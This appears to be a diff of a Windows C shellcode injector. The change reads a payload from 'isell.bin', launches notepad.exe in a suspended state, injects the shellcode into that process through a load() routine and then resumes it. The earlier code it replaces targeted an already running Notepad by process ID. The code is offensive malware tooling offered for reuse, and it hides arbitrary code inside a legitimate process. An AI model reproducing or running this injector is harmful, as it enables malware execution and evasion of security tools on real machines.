@@ -9,45 +9,16 @@
 //  But if you would like to use some scripts, you're more than welcome.
 //
 
-DWORD PID(const char* pname) {
-    PROCESSENTRY32 proce;
-    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hsnap == INVALID_HANDLE_VALUE) { return 0; }
-
-    //////////////////////////////////////////////
-
-    proce.dwSize = sizeof(PROCESSENTRY32);
-    if (Process32First(hsnap, &proce)) {
-        do {
-            if (strcmp(pname, proce.szExeFile) == 0) {
-                CloseHandle(hsnap);
-                return proce.th32ProcessID;
-            }
-        } while (Process32Next(hsnap, &proce));
-    }
-
-    //////////////////////////////////////////////
-
-    CloseHandle(hsnap);
-    return 0;
-}
-
 unsigned char* Shellcode(const char *fn, size_t *size) {
     FILE *f = fopen(fn, "rb");
-    if (!f) { return NULL; }
-
-    /////////////////////////////
+    if (!f) return NULL;
 
     fseek(f, 0, SEEK_END);
     *size = ftell(f);
     rewind(f);
 
-    /////////////////////////////
-
     unsigned char *buffer = (unsigned char*)malloc(*size);
     if (!buffer) { fclose(f); return NULL; }
-
-    /////////////////////////////
 
     fread(buffer, 1, *size, f);
     fclose(f);
@@ -55,31 +26,46 @@ unsigned char* Shellcode(const char *fn, size_t *size) {
 }
 
 int main() {
-    
-    //////////////////////////////////////////////
-
     size_t size;
-    const char* pname = "Notepad.exe";
     const char* payload = "isell.bin";
 
     unsigned char *shellcode = Shellcode(payload, &size);
-    if (!shellcode) return 1;
-
-    DWORD pid = PID(pname);
-    if (pid == 0) { 
-        printf("[!] Failed To Get Process ID"); 
-        exit(EXIT_FAILURE); 
+    if (!shellcode) {
+        printf("[!] Failed to load shellcode\n");
+        return 1;
     }
 
-    //////////////////////////////////////////////
+    STARTUPINFO si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
 
-    if (load(shellcode, pid)) {
-        printf("[+] Successfully Injected Shell Code. | Process ID --> %d", pid);
-        exit(EXIT_SUCCESS);
+    if (!CreateProcessA(
+        "C:\\Windows\\System32\\notepad.exe",
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_SUSPENDED,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    )) {
+        printf("[!] Failed to start notepad\n");
+        return 1;
     }
 
-    //////////////////////////////////////////////
+    if (load(shellcode, size, pi.dwProcessId)) {
+        printf("[+] Shellcode injected successfully into PID %d\n", pi.dwProcessId);
+        ResumeThread(pi.hThread); 
+    } else {
+        printf("[!] Injection failed\n");
+        TerminateProcess(pi.hProcess, 1);
+    }
 
-    printf("[!] Failed To Inject Shell Code. | Process ID --> %d", pid);
-    exit(EXIT_FAILURE);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    free(shellcode);
+
+    return 0;
 }
